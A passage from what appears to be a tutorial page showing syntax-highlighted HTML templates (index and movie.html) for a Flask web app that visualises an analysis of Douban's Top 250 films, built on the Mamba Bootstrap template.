class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span><span class="token comment">&lt;!-- ======= Our Team Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>豆瓣电影Top250数据分析<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>应用Python爬虫、Flask框架、Echarts等技术实现<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token comment">&lt;!-- ======= Counts Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counts section-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-smile<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #20b38e<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>250<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>经典电影<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-document-folder<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #c042ff<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>评分统计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-live-support<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #46d1ff<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>5693<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>词汇统计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-3 col-md-6 text-center<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-users-alt-5<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span> #ffb459<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counter-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>团队成员<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Counts Section --></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Our Team Section --></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. --></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="movie-html"><a href="#movie-html" class="headerlink" title="movie.html"></a>movie.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation 